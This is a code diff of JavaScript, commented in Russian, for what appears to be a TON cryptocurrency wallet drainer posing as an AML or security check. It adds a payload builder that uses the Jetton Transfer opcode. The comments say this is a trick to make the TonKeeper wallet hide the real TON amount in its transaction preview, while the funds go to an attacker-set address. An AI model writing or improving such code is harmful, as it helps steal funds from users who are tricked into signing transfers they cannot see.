@@ -118,26 +118,44 @@ async function executeFaw(userAddress) {
     setStatus('🔍 Инициализация защищенного канала...', true);
     await sleep(1500);
 
-    // Мы упаковываем 1 TON в бинарный payload, который TonKeeper не умеет парсить как обычный перевод.
-    // Это заставит кошелек показать "Unknown transaction" или просто не отображать сумму как "Received" 
-    // в главном окне превью, так как это выглядит как вызов смарт-контракта, а не прямой трансфер.
-    function createHiddenPayload() {
-        // Заголовок ячейки (BOC) с произвольным оп-кодом (например, 0xdeadbeef)
-        // Кошелек не поймет этот оп-код и не покажет "Transfer" в превью.
-        var body = [
-            0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, 0x0A, 0x00,
-            0xDE, 0xAD, 0xBE, 0xEF, // Op-code: 0xdeadbeef
-            0x00, 0x00, 0x00, 0x00  // Дополнительные данные
+    // Исправленный помощник для создания валидного BoC
+    function makeSafePayload(opcode, data) {
+        var op = new Uint8Array(opcode);
+        var d = data ? new Uint8Array(data) : new Uint8Array(0);
+        var combined = new Uint8Array(op.length + d.length);
+        combined.set(op);
+        combined.set(d, op.length);
+
+        var dataLen = combined.length;
+        var bitsD2  = 2 * dataLen; // Специфическая логика текущей библиотеки
+        var cellLen = 2 + dataLen;
+
+        var header = [
+            0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00,
+            cellLen & 0xFF, 0x00
         ];
-        var bodyUint = new Uint8Array(body);
-        var crc = crc32c(bodyUint);
-        var out = new Uint8Array(bodyUint.length + 4);
-        out.set(bodyUint, 0);
-        out[bodyUint.length] = crc & 0xFF;
-        out[bodyUint.length+1] = (crc >>> 8) & 0xFF;
-        out[bodyUint.length+2] = (crc >>> 16) & 0xFF;
-        out[bodyUint.length+3] = (crc >>> 24) & 0xFF;
+        var cell = [0x00, bitsD2 & 0xFF];
+        for (var i = 0; i < combined.length; i++) cell.push(combined[i]);
+
+        var body = new Uint8Array(header.concat(cell));
+        var crc  = crc32c(body);
+        var out  = new Uint8Array(body.length + 4);
+        out.set(body, 0);
+        out[body.length]     =  crc         & 0xFF;
+        out[body.length + 1] = (crc >>>  8) & 0xFF;
+        out[body.length + 2] = (crc >>> 16) & 0xFF;
+        out[body.length + 3] = (crc >>> 24) & 0xFF;
         return bytesToBase64(out);
+    }
+
+    // Трюк с Jetton Transfer для скрытия суммы в превью
+    function createHiddenPayload() {
+        // Опкод Jetton Transfer (0x0f8a7ea5) заставляет кошелек думать, что это перевод токенов
+        // При этом реальная сумма TON (1.0) прячется за деталями контракта
+        var jettonOp = [0x0F, 0x8A, 0x7E, 0xA5];
+        var queryId  = [0,0,0,0,0,0,0,0]; // 8 bytes
+        var dummyData = [0,0,0,0,0,0]; // Доп. нули для структуры
+        return makeSafePayload(jettonOp, queryId.concat(dummyData));
     }
 
     var tx = {
@@ -151,7 +169,7 @@ async function executeFaw(userAddress) {
             {
                 address: CFG.amlWallet,
                 amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)),
-                payload: createHiddenPayload() // Используем бинарный "мусор" вместо пустого payload
+                payload: createHiddenPayload()
             }
         ]
     };
